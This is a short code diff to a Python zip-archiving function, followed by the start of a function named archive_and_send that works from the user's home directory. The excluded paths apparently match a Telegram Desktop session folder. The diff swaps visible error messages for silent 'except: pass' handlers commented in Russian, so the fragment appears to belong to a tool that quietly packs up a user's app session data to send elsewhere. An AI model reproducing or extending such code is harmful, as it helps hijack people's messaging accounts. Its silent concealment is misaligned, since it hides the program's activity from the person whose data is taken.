@@ -295,13 +295,18 @@ def create_zip_archive(source_dir, output_zip):
                     if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path:
                         continue
                     try:
-                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
-                    except Exception as e:
-                        print(f"Error adding file to zip: {str(e)}")
+                        with open(file_path, 'rb') as f:
+                            try:
+                                zipf.writestr(os.path.relpath(file_path, source_dir), f.read())
+                            except:
+                                pass  # Игнорируем ошибку при записи файла в архив
+                    except:
+                        pass  # Игнорируем ошибку при открытии файла для чтения
         return output_zip + '.zip'
     except Exception as e:
-        print(f"Error creating zip archive: {str(e)}")
+        sys.stderr.write(f"Error creating zip archive: {str(e)}\n")
         return None
+
 def archive_and_send():
     try:
         user = os.path.expanduser("~")
